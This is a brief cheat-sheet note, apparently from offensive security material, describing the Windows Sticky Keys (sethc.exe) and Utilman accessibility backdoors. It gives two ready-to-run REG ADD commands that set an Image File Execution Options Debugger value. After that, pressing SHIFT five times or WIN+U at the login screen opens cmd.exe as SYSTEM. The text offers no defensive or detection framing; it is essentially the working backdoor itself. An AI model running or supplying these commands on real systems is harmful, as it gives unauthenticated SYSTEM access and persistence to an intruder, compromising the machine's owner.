Sethc is sticky keys and runs as SYSTEM, so if cmd.exe is in place instead of sethc (or if you can write to it), it can present a backdoor or easy SYSTEM access. Trigger is SHIFT five times

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f


Utilman is essentially the same, running as SYSTEM. Trigger is WIN + U

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f
